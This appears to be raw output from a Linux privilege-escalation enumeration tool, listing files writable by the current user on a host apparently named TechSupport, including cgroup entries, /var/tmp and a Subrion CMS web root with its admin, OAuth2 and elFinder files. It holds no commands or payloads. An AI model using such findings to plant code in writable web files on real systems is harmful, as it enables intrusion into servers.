/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-TechSupport\x2dvg-swap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2did-dm\x2dname\x2dTechSupport\x2d\x2dvg\x2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2did-dm\x2duuid\x2dLVM\x2deON0lfHKy4V2tgYESO8hwNXZWtBlDHcOuIsF045B64yAhkEK3sm98uNhb5q0LoB2.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2duuid-aa903007\x2d9d22\x2d426d\x2d837b\x2d9f0a5724786a.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-dm\x2d1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-TechSupport\x2d\x2dvg\x2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/samba-ad-dc.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-systemd\x2dfsck.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/winbind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/spool/samba
/var/tmp
/var/www/html/subrion
/var/www/html/subrion/.gitignore
/var/www/html/subrion/.htaccess
/var/www/html/subrion/CONTRIBUTING.md
/var/www/html/subrion/README.md
/var/www/html/subrion/admin
/var/www/html/subrion/admin/actions.php
/var/www/html/subrion/admin/adminer.php
/var/www/html/subrion/admin/blocks.php
/var/www/html/subrion/admin/configuration.php
/var/www/html/subrion/admin/currencies.php
/var/www/html/subrion/admin/database.php
/var/www/html/subrion/admin/email-templates.php
/var/www/html/subrion/admin/fieldgroups.php
/var/www/html/subrion/admin/fields.php
/var/www/html/subrion/admin/hooks.php
/var/www/html/subrion/admin/image-types.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/.gitignore
/var/www/html/subrion/admin/templates/default/Gulpfile.js
/var/www/html/subrion/admin/templates/default/blocks.tpl
/var/www/html/subrion/admin/templates/default/breadcrumb.tpl
/var/www/html/subrion/admin/templates/default/buttons.tpl
/var/www/html/subrion/admin/templates/default/configuration-test-email-btn.tpl
/var/www/html/subrion/admin/templates/default/configuration.tpl
/var/www/html/subrion/admin/templates/default/css
/var/www/html/subrion/admin/templates/default/css/bootstrap-calmy.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-darkness.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-default.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-gebeus-waterfall.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-radiant-orchid.css
/var/www/html/subrion/admin/templates/default/css/bootstrap-roseus.css
/var/www/html/subrion/admin/templates/default/css/grid-extra.css
/var/www/html/subrion/admin/templates/default/currencies.tpl
/var/www/html/subrion/admin/templates/default/custom-config.tpl
/var/www/html/subrion/admin/templates/default/database.tpl
/var/www/html/subrion/admin/templates/default/email-templates.tpl
/var/www/html/subrion/admin/templates/default/error.tpl
/var/www/html/subrion/admin/templates/default/extra_information.tpl
/var/www/html/subrion/admin/templates/default/field-type-content-fieldset.tpl
/var/www/html/subrion/admin/templates/default/field-type-content-manage.tpl
/var/www/html/subrion/admin/templates/default/fieldgroups.tpl
/var/www/html/subrion/admin/templates/default/fields-system.tpl
/var/www/html/subrion/admin/templates/default/fields.tpl
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/fonts/Subrion.svg
/var/www/html/subrion/admin/templates/default/fonts/Subrion.ttf
/var/www/html/subrion/admin/templates/default/fonts/Subrion.woff
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.eot
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.svg
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.ttf
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.woff
/var/www/html/subrion/admin/templates/default/fonts/fontawesome-webfont.woff2
/var/www/html/subrion/admin/templates/default/goto.tpl
/var/www/html/subrion/admin/templates/default/grid.tpl
/var/www/html/subrion/admin/templates/default/hooks.tpl
/var/www/html/subrion/admin/templates/default/image-types.tpl
/var/www/html/subrion/admin/templates/default/img
/var/www/html/subrion/admin/templates/default/img/ico
/var/www/html/subrion/admin/templates/default/img/ico/favicon.ico
/var/www/html/subrion/admin/templates/default/index.tpl
/var/www/html/subrion/admin/templates/default/invoice-view.tpl
/var/www/html/subrion/admin/templates/default/invoices.tpl
/var/www/html/subrion/admin/templates/default/js
/var/www/html/subrion/admin/templates/default/js/app.js
/var/www/html/subrion/admin/templates/default/js/bootstrap.min.js
/var/www/html/subrion/admin/templates/default/js/enquire.min.js
/var/www/html/subrion/admin/templates/default/languages.tpl
/var/www/html/subrion/admin/templates/default/layout.tpl
/var/www/html/subrion/admin/templates/default/less
/var/www/html/subrion/admin/templates/default/less/base-calmy.less
/var/www/html/subrion/admin/templates/default/less/base-darkness.less
/var/www/html/subrion/admin/templates/default/less/base-default.less
/var/www/html/subrion/admin/templates/default/less/base-gebeus-waterfall.less
/var/www/html/subrion/admin/templates/default/less/base-radiant-orchid.less
/var/www/html/subrion/admin/templates/default/less/base-roseus.less
/var/www/html/subrion/admin/templates/default/less/bootstrap
/var/www/html/subrion/admin/templates/default/less/bootstrap.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/alerts.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/badges.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/breadcrumbs.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/button-groups.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/buttons.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/carousel.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/close.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/code.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/component-animations.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/dropdowns.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/forms.less
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/background-variant.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/border-radius.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/buttons.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/center-block.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/clearfix.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/forms.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/gradients.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/grid-framework.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/grid.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/hide-text.less
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/less/bootstrap/navbar.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/navs.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/normalize.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/pager.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/pagination.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/panels.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/popovers.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/print.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/progress-bars.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/responsive-embed.less
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/less/components-theme.less
/var/www/html/subrion/admin/templates/default/less/components/blocks.less
/var/www/html/subrion/admin/templates/default/less/components/cards.less
/var/www/html/subrion/admin/templates/default/less/components/chips.less
/var/www/html/subrion/admin/templates/default/less/components/dropzone.less
/var/www/html/subrion/admin/templates/default/less/components/filter-toolbar.less
/var/www/html/subrion/admin/templates/default/less/components/forms.less
/var/www/html/subrion/admin/templates/default/less/components/table-light.less
/var/www/html/subrion/admin/templates/default/less/components/wells.less
/var/www/html/subrion/admin/templates/default/less/components/widgets.less
/var/www/html/subrion/admin/templates/default/less/ext-override.less
/var/www/html/subrion/admin/templates/default/less/ia-bootstrap.less
/var/www/html/subrion/admin/templates/default/less/layout
/var/www/html/subrion/admin/templates/default/less/layout/content.less
/var/www/html/subrion/admin/templates/default/less/layout/layout.less
/var/www/html/subrion/admin/templates/default/less/layout/nav.less
/var/www/html/subrion/admin/templates/default/less/layout/nav.submenu.less
/var/www/html/subrion/admin/templates/default/less/layout/topbar.less
/var/www/html/subrion/admin/templates/default/less/pages
/var/www/html/subrion/admin/templates/default/less/pages/page.login.less
/var/www/html/subrion/admin/templates/default/less/pages/page.permissions.less
/var/www/html/subrion/admin/templates/default/less/pages/page.plans.less
/var/www/html/subrion/admin/templates/default/less/utils.less
/var/www/html/subrion/admin/templates/default/less/vars-calmy.less
/var/www/html/subrion/admin/templates/default/less/vars-darkness.less
/var/www/html/subrion/admin/templates/default/less/vars-default.less
/var/www/html/subrion/admin/templates/default/less/vars-gebeus-waterfall.less
/var/www/html/subrion/admin/templates/default/less/vars-radiant-orchid.less
/var/www/html/subrion/admin/templates/default/less/vars-roseus.less
/var/www/html/subrion/admin/templates/default/less/vendor
/var/www/html/subrion/admin/templates/default/less/vendor/bootstrap-switch.less
/var/www/html/subrion/admin/templates/default/less/vendor/font-subrion.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/animated.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/bordered-pulled.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/core.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/fixed-width.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/font-awesome.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/icons-aliases.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/icons.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/larger.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/list.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/mixins.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/path.less
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/default/members.tpl
/var/www/html/subrion/admin/templates/default/menu.tpl
/var/www/html/subrion/admin/templates/default/menus.tpl
/var/www/html/subrion/admin/templates/default/modules.tpl
/var/www/html/subrion/admin/templates/default/notification.tpl
/var/www/html/subrion/admin/templates/default/package.json
/var/www/html/subrion/admin/templates/default/pages.tpl
/var/www/html/subrion/admin/templates/default/permissions.tpl
/var/www/html/subrion/admin/templates/default/phrases.tpl
/var/www/html/subrion/admin/templates/default/plans.tpl
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/emails/.babelrc
/var/www/html/subrion/admin/templates/emails/.gitignore
/var/www/html/subrion/admin/templates/emails/LICENSE
/var/www/html/subrion/admin/templates/emails/README.md
/var/www/html/subrion/admin/templates/emails/dist
/var/www/html/subrion/admin/templates/emails/dist/assets
/var/www/html/subrion/admin/templates/emails/dist/assets/img
/var/www/html/subrion/admin/templates/emails/dist/css
/var/www/html/subrion/admin/templates/emails/dist/css/app.css
/var/www/html/subrion/admin/templates/emails/dist/email.index.html
/var/www/html/subrion/admin/templates/emails/dist/email.invoice_created.html
/var/www/html/subrion/admin/templates/emails/dist/email.layout.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_approved.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_disapproved.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_registration.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_registration_admin.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_registration_notification.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_removal.html
/var/www/html/subrion/admin/templates/emails/dist/email.password_changement.html
/var/www/html/subrion/admin/templates/emails/dist/email.password_restoration.html
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/emails/gulpfile.babel.js
/var/www/html/subrion/admin/templates/emails/package.json
/var/www/html/subrion/admin/templates/emails/src
/var/www/html/subrion/admin/templates/emails/src/assets
/var/www/html/subrion/admin/templates/emails/src/assets/img
/var/www/html/subrion/admin/templates/emails/src/assets/img/.gitkeep
/var/www/html/subrion/admin/templates/emails/src/assets/scss
/var/www/html/subrion/admin/templates/emails/src/assets/scss/_settings.scss
/var/www/html/subrion/admin/templates/emails/src/assets/scss/app.scss
/var/www/html/subrion/admin/templates/emails/src/helpers
/var/www/html/subrion/admin/templates/emails/src/helpers/raw.js
/var/www/html/subrion/admin/templates/emails/src/layouts
/var/www/html/subrion/admin/templates/emails/src/layouts/default.html
/var/www/html/subrion/admin/templates/emails/src/pages
/var/www/html/subrion/admin/templates/emails/src/pages/email.index.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.invoice_created.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.layout.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_approved.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_disapproved.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration_admin.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_registration_notification.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_removal.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_changement.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_restoration.html
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/admin/templates/emails/src/partials/.gitkeep
/var/www/html/subrion/admin/transactions.php
/var/www/html/subrion/admin/uploads.php
/var/www/html/subrion/admin/usergroups.php
/var/www/html/subrion/admin/visual.php
/var/www/html/subrion/backup
/var/www/html/subrion/backup/.htaccess
/var/www/html/subrion/changelog.txt
/var/www/html/subrion/composer.json
/var/www/html/subrion/favicon.ico
/var/www/html/subrion/front
/var/www/html/subrion/front/actions.php
/var/www/html/subrion/front/api.php
/var/www/html/subrion/front/captcha.php
/var/www/html/subrion/front/cron.php
/var/www/html/subrion/front/favorites.php
/var/www/html/subrion/front/login.php
/var/www/html/subrion/front/members.php
/var/www/html/subrion/front/page.php
/var/www/html/subrion/front/pay.php
/var/www/html/subrion/front/profile.php
/var/www/html/subrion/front/redirect.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/includes/OAuth2
/var/www/html/subrion/includes/OAuth2/Autoloader.php
/var/www/html/subrion/includes/OAuth2/ClientAssertionType
/var/www/html/subrion/includes/OAuth2/ClientAssertionType/ClientAssertionTypeInterface.php
/var/www/html/subrion/includes/OAuth2/ClientAssertionType/HttpBasic.php
/var/www/html/subrion/includes/OAuth2/Controller
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeController.php
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeControllerInterface.php
/var/www/html/subrion/includes/OAuth2/Controller/ResourceController.php
/var/www/html/subrion/includes/OAuth2/Controller/ResourceControllerInterface.php
/var/www/html/subrion/includes/OAuth2/Controller/TokenController.php
/var/www/html/subrion/includes/OAuth2/Controller/TokenControllerInterface.php
/var/www/html/subrion/includes/OAuth2/Encryption
/var/www/html/subrion/includes/OAuth2/Encryption/EncryptionInterface.php
/var/www/html/subrion/includes/OAuth2/Encryption/FirebaseJwt.php
/var/www/html/subrion/includes/OAuth2/Encryption/Jwt.php
/var/www/html/subrion/includes/OAuth2/GrantType
/var/www/html/subrion/includes/OAuth2/GrantType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/GrantType/ClientCredentials.php
/var/www/html/subrion/includes/OAuth2/GrantType/GrantTypeInterface.php
/var/www/html/subrion/includes/OAuth2/GrantType/JwtBearer.php
/var/www/html/subrion/includes/OAuth2/GrantType/RefreshToken.php
/var/www/html/subrion/includes/OAuth2/GrantType/UserCredentials.php
/var/www/html/subrion/includes/OAuth2/OpenID
/var/www/html/subrion/includes/OAuth2/OpenID/Controller
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/AuthorizeController.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/AuthorizeControllerInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/UserInfoController.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/UserInfoControllerInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/GrantType
/var/www/html/subrion/includes/OAuth2/OpenID/GrantType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/CodeIdToken.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/CodeIdTokenInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdToken.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdTokenInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdTokenToken.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdTokenTokenInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/Storage
/var/www/html/subrion/includes/OAuth2/OpenID/Storage/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/Storage/UserClaimsInterface.php
/var/www/html/subrion/includes/OAuth2/Request.php
/var/www/html/subrion/includes/OAuth2/RequestInterface.php
/var/www/html/subrion/includes/OAuth2/Response.php
/var/www/html/subrion/includes/OAuth2/ResponseInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessToken.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessTokenInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php
/var/www/html/subrion/includes/OAuth2/ResponseType/ResponseTypeInterface.php
/var/www/html/subrion/includes/OAuth2/Scope.php
/var/www/html/subrion/includes/OAuth2/ScopeInterface.php
/var/www/html/subrion/includes/OAuth2/Server.php
/var/www/html/subrion/includes/OAuth2/Storage
/var/www/html/subrion/includes/OAuth2/Storage/AccessTokenInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php
/var/www/html/subrion/includes/OAuth2/Storage/ClientCredentialsInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/ClientInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/CouchbaseDB.php
/var/www/html/subrion/includes/OAuth2/Storage/DynamoDB.php
/var/www/html/subrion/includes/OAuth2/Storage/JwtAccessToken.php
/var/www/html/subrion/includes/OAuth2/Storage/JwtAccessTokenInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/JwtBearerInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/Memory.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/includes/OAuth2/TokenType/Bearer.php
/var/www/html/subrion/includes/OAuth2/TokenType/Mac.php
/var/www/html/subrion/includes/OAuth2/TokenType/TokenTypeInterface.php
/var/www/html/subrion/includes/PHPImageWorkshop
/var/www/html/subrion/includes/PHPImageWorkshop/Core
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception/ImageWorkshopLayerException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception/ImageWorkshopLibException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/GifCreator.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/GifFrameExtractor.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/ImageWorkshopLayer.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/ImageWorkshopLib.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exception
/var/www/html/subrion/includes/PHPImageWorkshop/Exception/ImageWorkshopBaseException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exception/ImageWorkshopException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exif
/var/www/html/subrion/includes/PHPImageWorkshop/Exif/ExifOrientations.php
/var/www/html/subrion/includes/PHPImageWorkshop/Fonts
/var/www/html/subrion/includes/PHPImageWorkshop/Fonts/Arial.ttf
/var/www/html/subrion/includes/PHPImageWorkshop/ImageWorkshop.php
/var/www/html/subrion/includes/adminer
/var/www/html/subrion/includes/adminer/adminer.css
/var/www/html/subrion/includes/adminer/adminer.js
/var/www/html/subrion/includes/adminer/adminer.script.inc
/var/www/html/subrion/includes/api
/var/www/html/subrion/includes/api/auth.php
/var/www/html/subrion/includes/api/entity
/var/www/html/subrion/includes/api/entity/abstract.php
/var/www/html/subrion/includes/api/entity/field.php
/var/www/html/subrion/includes/api/entity/member.php
/var/www/html/subrion/includes/api/entity/migration.php
/var/www/html/subrion/includes/api/entity/phrase.php
/var/www/html/subrion/includes/api/push.php
/var/www/html/subrion/includes/api/renderer
/var/www/html/subrion/includes/api/renderer/abstract.php
/var/www/html/subrion/includes/api/renderer/interface.php
/var/www/html/subrion/includes/api/renderer/json.php
/var/www/html/subrion/includes/api/renderer/raw.php
/var/www/html/subrion/includes/api/request.php
/var/www/html/subrion/includes/api/response.php
/var/www/html/subrion/includes/api/storage.php
/var/www/html/subrion/includes/classes
/var/www/html/subrion/includes/classes/ia.admin.block.php
/var/www/html/subrion/includes/classes/ia.admin.dbcontrol.php
/var/www/html/subrion/includes/classes/ia.admin.module.php
/var/www/html/subrion/includes/classes/ia.admin.page.php
/var/www/html/subrion/includes/classes/ia.admin.sitemap.php
/var/www/html/subrion/includes/classes/ia.base.controller.admin.php
/var/www/html/subrion/includes/classes/ia.base.controller.module.admin.php
/var/www/html/subrion/includes/classes/ia.base.db.php
/var/www/html/subrion/includes/classes/ia.base.item.admin.php
/var/www/html/subrion/includes/classes/ia.base.item.front.php
/var/www/html/subrion/includes/classes/ia.base.module.admin.php
#)You_can_write_even_more_files_inside_last_directory
/var/www/html/subrion/includes/cron
/var/www/html/subrion/includes/cron/cleanup.php
/var/www/html/subrion/includes/cron/featured-expiration.php
/var/www/html/subrion/includes/cron/sitemap.php
/var/www/html/subrion/includes/cron/sponsored-expiration.php
/var/www/html/subrion/includes/elfinder
/var/www/html/subrion/includes/elfinder/Changelog
/var/www/html/subrion/includes/elfinder/LICENSE.md
/var/www/html/subrion/includes/elfinder/README.md
/var/www/html/subrion/includes/elfinder/css
/var/www/html/subrion/includes/elfinder/css/elfinder.full.css
/var/www/html/subrion/includes/elfinder/css/elfinder.min.css
/var/www/html/subrion/includes/elfinder/css/theme.css
/var/www/html/subrion/includes/elfinder/elfinder.html
/var/www/html/subrion/includes/elfinder/img
/var/www/html/subrion/includes/elfinder/js
/var/www/html/subrion/includes/elfinder/js/elfinder.full.js
/var/www/html/subrion/includes/elfinder/js/elfinder.min.js
/var/www/html/subrion/includes/elfinder/js/extras
/var/www/html/subrion/includes/elfinder/js/extras/editors.default.js
/var/www/html/subrion/includes/elfinder/js/extras/editors.default.min.js
/var/www/html/subrion/includes/elfinder/js/extras/encoding-japanese.min.js
/var/www/html/subrion/includes/elfinder/js/extras/quicklook.googledocs.js
/var/www/html/subrion/includes/elfinder/js/extras/quicklook.googledocs.min.js
/var/www/html/subrion/includes/elfinder/js/i18n
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.LANG.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.ar.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.bg.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.ca.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.cs.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.da.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.de.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.el.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.es.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.fa.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.fallback.js
